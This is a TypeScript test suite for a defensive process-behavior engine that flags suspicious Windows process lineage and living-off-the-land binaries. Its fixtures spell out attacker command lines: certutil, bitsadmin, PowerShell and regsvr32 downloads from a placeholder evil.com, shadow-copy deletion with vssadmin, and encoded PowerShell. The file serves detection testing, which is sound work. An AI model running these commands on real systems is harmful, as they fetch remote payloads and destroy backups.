import { describe, it, expect, beforeEach } from 'vitest';
import { BehaviorEngineService } from '../../services/behavior-engine.service';

describe('BehaviorEngineService (Phase F — Process Lineage + LOLBin Monitoring)', () => {
  let engine: BehaviorEngineService;

  beforeEach(() => {
    engine = new BehaviorEngineService({
      maxTrackedProcesses: 50,
      maxLineageDepth: 5,
      ttlMs: 60000
    });
  });

  describe('1. LOLBin Detection Matrix (25+ Binaries)', () => {
    const knownLolbins = [
      'powershell.exe',
      'pwsh.exe',
      'cmd.exe',
      'wscript.exe',
      'cscript.exe',
      'mshta.exe',
      'rundll32.exe',
      'regsvr32.exe',
      'certutil.exe',
      'bitsadmin.exe',
      'msiexec.exe',
      'installutil.exe',
      'regasm.exe',
      'regsvcs.exe',
      'cmstp.exe',
      'msbuild.exe',
      'vssadmin.exe',
      'wmic.exe',
      'hh.exe',
      'schtasks.exe',
      'at.exe',
      'sc.exe',
      'net.exe',
      'net1.exe',
      'forfiles.exe',
      'pcalua.exe',
      'scriptrunner.exe',
      'bash.exe',
      'wsl.exe'
    ];

    it('identifies all 25+ known Windows LOLBins', () => {
      for (const bin of knownLolbins) {
        expect(engine.isLolbin(bin)).toBe(true);
        expect(engine.isLolbin(`C:\\Windows\\System32\\${bin}`)).toBe(true);
        expect(engine.isLolbin(bin.toUpperCase())).toBe(true);
      }
    });

    it('returns false for standard benign software binaries', () => {
      const benign = [
        'notepad.exe',
        'calc.exe',
        'code.exe',
        'chrome.exe',
        'firefox.exe',
        'slack.exe',
        'spotify.exe',
        'git.exe',
        'explorer.exe'
      ];
      for (const bin of benign) {
        expect(engine.isLolbin(bin)).toBe(false);
      }
    });
  });

  describe('2. Path Masquerading Detection', () => {
    it('flags system binaries located outside Windows System32 directory', () => {
      const result = engine.evaluateProcess({
        pid: 3001,
        name: 'svchost.exe',
        executablePath: 'C:\\Users\\Public\\svchost.exe',
        commandLine: 'C:\\Users\\Public\\svchost.exe'
      });

      expect(result.riskScore).toBeGreaterThanOrEqual(85);
      expect(result.evidence.some(e => e.ruleId === 'behav-system-path-masquerade')).toBe(true);
      expect(result.evidenceFactors.some(f => f.toLowerCase().includes('outside legitimate system directory'))).toBe(true);
      expect(result.verdict).toBe('BLOCK');
      expect(result.engineVerdict).toBe('CONTAIN_PROCESS');
    });

    it('allows system binaries located in legitimate System32 path', () => {
      const result = engine.evaluateProcess({
        pid: 3002,
        name: 'svchost.exe',
        executablePath: 'C:\\Windows\\System32\\svchost.exe',
        commandLine: 'C:\\Windows\\System32\\svchost.exe -k netsvcs'
      });

      expect(result.evidenceFactors.some(f => f.toLowerCase().includes('outside legitimate system directory'))).toBe(false);
      expect(result.verdict).toBe('ALLOW');
    });
  });

  describe('3. Parent-Child Process Lineage Anomalies', () => {
    it('flags Microsoft Office spawning a shell (WINWORD.EXE -> cmd.exe)', () => {
      // Register parent
      engine.recordProcess({
        pid: 1000,
        name: 'WINWORD.EXE',
        executablePath: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE',
        commandLine: '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"'
      });

      // Register child
      const childEval = engine.evaluateProcess({
        pid: 1001,
        ppid: 1000,
        name: 'cmd.exe',
        executablePath: 'C:\\Windows\\System32\\cmd.exe',
        commandLine: 'cmd.exe /c whoami'
      });

      expect(childEval.riskScore).toBeGreaterThanOrEqual(80);
      expect(childEval.threatName).toBe('OFFICE_SHELL_SPAWN');
      expect(childEval.evidenceFactors.some(f => f.toLowerCase().includes('office'))).toBe(true);
      expect(childEval.lineageChain).toEqual(['WINWORD.EXE', 'cmd.exe']);
    });

    it('flags Web Browser spawning LOLBin (chrome.exe -> powershell.exe)', () => {
      engine.recordProcess({
        pid: 2000,
        name: 'chrome.exe',
        executablePath: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe'
      });

      const childEval = engine.evaluateProcess({
        pid: 2001,
        ppid: 2000,
        name: 'powershell.exe',
        executablePath: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        commandLine: 'powershell.exe -NoProfile'
      });

      expect(childEval.riskScore).toBeGreaterThanOrEqual(75);
      expect(childEval.threatName).toBe('BROWSER_SHELL_SPAWN');
      expect(childEval.evidenceFactors.some(f => f.toLowerCase().includes('browser'))).toBe(true);
    });

    it('flags Chained Command Interpreters (cmd.exe -> powershell.exe)', () => {
      engine.recordProcess({
        pid: 3000,
        name: 'cmd.exe',
        executablePath: 'C:\\Windows\\System32\\cmd.exe'
      });

      const childEval = engine.evaluateProcess({
        pid: 3001,
        ppid: 3000,
        name: 'powershell.exe',
        executablePath: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        commandLine: 'powershell.exe -c Get-Process'
      });

      expect(childEval.evidenceFactors.some(f => f.includes('Chained command interpreter'))).toBe(true);
    });

    it('flags executable in user-writable directory spawning LOLBin', () => {
      engine.recordProcess({
        pid: 4000,
        name: 'payload.exe',
        executablePath: 'C:\\Users\\User\\AppData\\Local\\Temp\\payload.exe'
      });

      const childEval = engine.evaluateProcess({
        pid: 4001,
        ppid: 4000,
        name: 'certutil.exe',
        executablePath: 'C:\\Windows\\System32\\certutil.exe',
        commandLine: 'certutil.exe -urlcache -f http://evil.com/test.bin test.bin'
      });

      expect(childEval.riskScore).toBeGreaterThanOrEqual(85);
      expect(childEval.evidenceFactors.some(f => f.includes('User-writable executable'))).toBe(true);
      expect(childEval.engineVerdict).toBe('CONTAIN_PROCESS');
    });
  });

  describe('4. Command-Line Regex Heuristic Inspection', () => {
    it('detects Base64 encoded PowerShell commands', () => {
      const result = engine.evaluateProcess({
        pid: 5001,
        name: 'powershell.exe',
        commandLine: 'powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...'
      });

      expect(result.riskScore).toBeGreaterThanOrEqual(85);
      expect(result.evidence.some(e => e.ruleId === 'behav-ps1-encoded-command')).toBe(true);
      expect(result.evidenceFactors.some(f => f.toLowerCase().includes('encoded'))).toBe(true);
      expect(result.engineVerdict).toBe('CONTAIN_PROCESS');
    });

    it('detects hidden window and bypass flags in PowerShell', () => {
      const result = engine.evaluateProcess({
        pid: 5002,
        name: 'powershell.exe',
        commandLine: 'powershell.exe -w hidden -ep bypass -file test.ps1'
      });

      expect(result.evidence.some(e => e.ruleId === 'behav-ps1-hidden-bypass')).toBe(true);
      expect(result.evidenceFactors.some(f => f.toLowerCase().includes('hidden') || f.toLowerCase().includes('bypass'))).toBe(true);
      expect(result.riskScore).toBeGreaterThanOrEqual(70);
    });

    it('detects .NET / PowerShell download cradles', () => {
      const result = engine.evaluateProcess({
        pid: 5003,
        name: 'powershell.exe',
        commandLine: 'powershell.exe (New-Object Net.WebClient).DownloadString("http://evil.com/x")'
      });

      expect(result.riskScore).toBeGreaterThanOrEqual(85);
      expect(result.evidence.some(e => e.ruleId === 'behav-ps1-hidden-download-cradle')).toBe(true);
      expect(result.evidenceFactors.some(f => f.toLowerCase().includes('download cradle'))).toBe(true);
      expect(result.engineVerdict).toBe('CONTAIN_PROCESS');
    });

    it('detects certutil URL cache downloading', () => {
      const result = engine.evaluateProcess({
        pid: 5004,
        name: 'certutil.exe',
        commandLine: 'certutil.exe -urlcache -split -f http://evil.com/mal.exe C:\\temp\\mal.exe'
      });

      expect(result.riskScore).toBeGreaterThanOrEqual(70);
      expect(result.evidence.some(e => e.ruleId === 'behav-certutil-urlcache-download')).toBe(true);
      expect(result.evidenceFactors.some(f => f.toLowerCase().includes('certutil'))).toBe(true);
    });

    it('detects bitsadmin background transfer', () => {
      const result = engine.evaluateProcess({
        pid: 5005,
        name: 'bitsadmin.exe',
        commandLine: 'bitsadmin /transfer eviljob /download /priority high http://evil.com/x C:\\temp\\x'
      });

      expect(result.riskScore).toBeGreaterThanOrEqual(70);
      expect(result.evidence.some(e => e.ruleId === 'behav-bitsadmin-transfer')).toBe(true);
      expect(result.evidenceFactors.some(f => f.toLowerCase().includes('bitsadmin'))).toBe(true);
    });

    it('detects mshta script or remote URL execution', () => {
      const result = engine.evaluateProcess({
        pid: 5006,
        name: 'mshta.exe',
        commandLine: 'mshta.exe javascript:eval(unescape("%20..."))'
      });

      expect(result.riskScore).toBeGreaterThanOrEqual(85);
      expect(result.evidence.some(e => e.ruleId === 'behav-mshta-remote-script')).toBe(true);
      expect(result.evidenceFactors.some(f => f.toLowerCase().includes('mshta') || f.includes('HTML Application'))).toBe(true);
    });

    it('detects regsvr32 remote scriptlet / scrobj execution', () => {
      const result = engine.evaluateProcess({
        pid: 5007,
        name: 'regsvr32.exe',
        commandLine: 'regsvr32.exe /s /u /i:http://evil.com/drop.sct scrobj.dll'
      });

      expect(result.riskScore).toBeGreaterThanOrEqual(85);
      expect(result.evidence.some(e => e.ruleId === 'behav-regsvr32-squiblydoo')).toBe(true);
      expect(result.evidenceFactors.some(f => f.toLowerCase().includes('regsvr32'))).toBe(true);
    });

    it('detects rundll32 loading DLL from temporary folder', () => {
      const result = engine.evaluateProcess({
        pid: 5008,
        name: 'rundll32.exe',
        commandLine: 'rundll32.exe C:\\Users\\User\\AppData\\Local\\Temp\\loader.dll,Start'
      });

      expect(result.evidence.some(e => e.ruleId === 'behav-rundll32-inline-script')).toBe(true);
      expect(result.evidenceFactors.some(f => f.toLowerCase().includes('rundll32'))).toBe(true);
    });

    it('detects vssadmin deleting volume shadow copies', () => {
      const result = engine.evaluateProcess({
        pid: 5009,
        name: 'vssadmin.exe',
        commandLine: 'vssadmin.exe delete shadows /all /quiet'
      });

      expect(result.riskScore).toBeGreaterThanOrEqual(85);
      expect(result.evidence.some(e => e.ruleId === 'behav-ransomware-shadow-delete')).toBe(true);
      expect(result.evidenceFactors.some(f => f.toLowerCase().includes('shadow'))).toBe(true);
      expect(result.engineVerdict).toBe('CONTAIN_PROCESS');
    });

    it('detects piped shell execution', () => {
      const result = engine.evaluateProcess({
        pid: 5010,
        name: 'cmd.exe',
        commandLine: 'type file.txt | powershell.exe -'
      });

      expect(result.evidence.some(e => e.ruleId === 'behav-piped-interpreter-chain')).toBe(true);
      expect(result.evidenceFactors.some(f => f.toLowerCase().includes('piped'))).toBe(true);
    });

    it('detects installutil uninstall bypass', () => {
      const result = engine.evaluateProcess({
        pid: 5011,
        name: 'installutil.exe',
        commandLine: 'installutil.exe /logfile= /LogToConsole=false /u C:\\temp\\evil.exe'
      });

      expect(result.evidence.some(e => e.ruleId === 'behav-installutil-uninstall-bypass')).toBe(true);
      expect(result.evidenceFactors.some(f => f.toLowerCase().includes('installutil'))).toBe(true);
    });

    it('detects cmstp silent execution', () => {
      const result = engine.evaluateProcess({
        pid: 5012,
        name: 'cmstp.exe',
        commandLine: 'cmstp.exe /s /ni C:\\temp\\evil.inf'
      });

      expect(result.evidence.some(e => e.ruleId === 'behav-cmstp-profile-install')).toBe(true);
      expect(result.evidenceFactors.some(f => f.toLowerCase().includes('cmstp') || f.toLowerCase().includes('connection manager'))).toBe(true);
    });

    it('detects msbuild inline project build', () => {
      const result = engine.evaluateProcess({
        pid: 5013,
        name: 'msbuild.exe',
        commandLine: 'msbuild.exe C:\\temp\\inline.csproj'
      });

      expect(result.evidence.some(e => e.ruleId === 'behav-msbuild-inline-task')).toBe(true);
      expect(result.evidenceFactors.some(f => f.toLowerCase().includes('msbuild'))).toBe(true);
    });
  });

  describe('5. PID Reuse Protection & Compound Instance Keys', () => {
    it('isolates historical process data when OS reuses PID', () => {
      // First process with PID 7000 at T0
      const node1 = engine.recordProcess({
        pid: 7000,
        name: 'benign_worker.exe',
        creationDate: new Date('2026-10-06T10:00:00Z')
      });

      // Second process with PID 7000 at T1 (PID reused by OS)
      const node2 = engine.recordProcess({
        pid: 7000,
        name: 'malicious_worker.exe',
        creationDate: new Date('2026-10-06T11:00:00Z')
      });

      expect(node1.instanceKey).not.toBe(node2.instanceKey);
      expect(node1.processName).toBe('benign_worker.exe');
      expect(node2.processName).toBe('malicious_worker.exe');

      // The graph should resolve current PID 7000 to the latest instance
      const current = engine.getProcessByPid(7000);
      expect(current?.instanceKey).toBe(node2.instanceKey);
      expect(current?.processName).toBe('malicious_worker.exe');
    });
  });

  describe('6. Bounded Storage & Eviction', () => {
    it('strictly bounds graph size to maxTrackedProcesses', () => {
      const boundedEngine = new BehaviorEngineService({
        maxTrackedProcesses: 15
      });

      for (let i = 1; i <= 40; i++) {
        boundedEngine.recordProcess({
          pid: 8000 + i,
          name: `proc_${i}.exe`
        });
      }

      expect(boundedEngine.getTrackedProcessCount()).toBeLessThanOrEqual(15);
    });

    it('bounds lineage chain depth to maxLineageDepth', () => {
      const deepEngine = new BehaviorEngineService({
        maxLineageDepth: 4
      });

      // Chain: 1 -> 2 -> 3 -> 4 -> 5 -> 6
      for (let i = 1; i <= 6; i++) {
        deepEngine.recordProcess({
          pid: 9000 + i,
          ppid: i === 1 ? undefined : 9000 + i - 1,
          name: `level_${i}.exe`
        });
      }

      const chain = deepEngine.getLineage(9006);
      expect(chain.length).toBeLessThanOrEqual(4);
    });

    it('handles a burst of 1,000 process updates within bounded memory', () => {
      const burstEngine = new BehaviorEngineService({
        maxTrackedProcesses: 200
      });

      for (let i = 0; i < 1000; i++) {
        burstEngine.recordProcess({
          pid: 10000 + (i % 300),
          name: `burst_${i}.exe`,
          commandLine: `burst_${i}.exe --worker`
        });
      }

      expect(burstEngine.getTrackedProcessCount()).toBeLessThanOrEqual(200);
    });
  });

  describe('7. Critical OS Process Immunity (RULE-09)', () => {
    it('marks critical Windows system processes as protected', () => {
      const systemProcs = [
        { pid: 0, name: 'System Idle Process' },
        { pid: 4, name: 'System' },
        { pid: 100, name: 'smss.exe' },
        { pid: 200, name: 'csrss.exe' },
        { pid: 300, name: 'wininit.exe' },
        { pid: 400, name: 'services.exe' },
        { pid: 500, name: 'lsass.exe' },
        { pid: 600, name: 'lsm.exe' },
        { pid: 700, name: 'winlogon.exe' },
        { pid: 800, name: 'svchost.exe', executablePath: 'C:\\Windows\\System32\\svchost.exe' }
      ];

      for (const sp of systemProcs) {
        expect(engine.isProtectedSystemProcess(sp.pid, sp.name, sp.executablePath)).toBe(true);
      }
    });

    it('never assigns engineVerdict CONTAIN_PROCESS to a protected process', () => {
      const result = engine.evaluateProcess({
        pid: 4,
        name: 'System',
        commandLine: 'powershell.exe -enc SQBFAFgA...' // even with adversarial arguments
      });

      expect(result.isProtectedSystemProcess).toBe(true);
      expect(result.engineVerdict).not.toBe('CONTAIN_PROCESS');
    });
  });

  describe('8. Sensitive Credential & Password Masking', () => {
    it('masks passwords and secrets in command line telemetry', () => {
      const raw = 'mytool.exe --user admin --password SuperSecretPass123! --token ghp_1234567890abcdef';
      const sanitized = engine.sanitizeCommandLine(raw);

      expect(sanitized).not.toContain('SuperSecretPass123!');
      expect(sanitized).not.toContain('ghp_1234567890abcdef');
      expect(sanitized).toContain('[REDACTED]');
    });
  });
});
